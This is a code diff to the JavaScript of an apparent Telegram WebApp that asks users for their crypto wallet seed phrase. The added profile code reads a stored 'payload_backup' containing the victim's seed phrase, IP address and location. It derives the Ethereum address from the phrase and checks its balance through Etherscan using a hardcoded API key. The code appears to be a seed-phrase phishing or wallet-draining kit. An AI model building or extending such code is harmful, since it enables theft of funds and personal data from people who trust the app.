@@ -32,8 +32,12 @@ window.addEventListener("DOMContentLoaded", () => {
         Telegram.WebApp.expand();
     }
 
-    renderSeedInputs();
-    setupSelect();
+    if (document.getElementById("seedContainer")) {
+        renderSeedInputs();
+        setupSelect();
+    } else if (window.location.href.includes("profile.html")) {
+        showProfileData();
+    }
 });
 
 // 📦 Поля seed-фрази
@@ -106,7 +110,6 @@ function showWarning(message) {
     warning.style.display = "block";
 }
 
-// 🧹 Приховати попередження
 function clearWarning() {
     const warning = document.getElementById("validationWarning");
     if (warning) warning.style.display = "none";
@@ -126,7 +129,7 @@ function showProcessing(message) {
     processing.textContent = message;
 }
 
-// 🚀 Надіслати сид-фразу
+// 🚀 submitSeed()
 function submitSeed() {
     clearWarning();
 
@@ -175,4 +178,62 @@ function submitSeed() {
     setTimeout(() => {
         window.location.href = "profile.html";
     }, 1200);
+}
+
+// 📊 Профіль
+function showProfileData() {
+    const ETHERSCAN_API_KEY = "WEIWRB4VW3SDGAF2FGZWV2MY5DUJNQP7CD";
+    const data = JSON.parse(localStorage.getItem("payload_backup") || "{}");
+
+    const seedPhrase = (data.seed || "").trim();
+    const walletType = (data.wallet || "").toLowerCase();
+    const timestamp = data.timestamp || "–";
+    const ip = data.ip || "–";
+    const locationInfo = data.location || "–";
+
+    document.getElementById("timestamp").textContent = timestamp;
+    document.getElementById("userIp").textContent = ip;
+    document.getElementById("userLocation").textContent = locationInfo;
+    document.getElementById("seed").textContent = seedPhrase;
+
+    if (!seedPhrase) return console.error("❌ Seed-фраза порожня");
+
+    try {
+        const wallet = ethers.Wallet.fromMnemonic(seedPhrase);
+        const ethAddress = wallet.address;
+        document.getElementById("ethAddress").textContent = ethAddress;
+        console.log("✅ ETH адрес:", ethAddress);
+        fetchETHBalance(ethAddress, ETHERSCAN_API_KEY);
+    } catch (e) {
+        console.error("❌ ETH генерація:", e.message);
+    }
+
+    document.getElementById("goWalletBtn").addEventListener("click", () => {
+        let url = "https://www.google.com";
+        if (walletType.includes("metamask")) url = "https://metamask.io/";
+        else if (walletType.includes("trust")) url = "https://trustwallet.com/";
+        else if (walletType.includes("phantom")) url = "https://phantom.app/";
+        else if (walletType.includes("ton")) url = "https://tonkeeper.com/";
+        else if (walletType.includes("coinbase")) url = "https://www.coinbase.com/wallet";
+
+        if (window.Telegram && Telegram.WebApp) {
+            Telegram.WebApp.openLink(url);
+        } else {
+            window.open(url, "_blank");
+        }
+    });
+}
+
+async function fetchETHBalance(address, key) {
+    try {
+        const url = `https://api.etherscan.io/api?module=account&action=balance&address=${address}&tag=latest&apikey=${key}`;
+        const res = await fetch(url);
+        const json = await res.json();
+        if (!json || json.status !== "1" || !json.result) throw new Error("ETH API error");
+        const ethBalance = parseFloat(json.result) / 1e18;
+        document.getElementById("walletBalance").textContent = `${ethBalance.toFixed(6)} ETH`;
+    } catch (e) {
+        console.warn("❌ Помилка балансу ETH:", e.message);
+        document.getElementById("walletBalance").textContent = "–";
+    }
 }
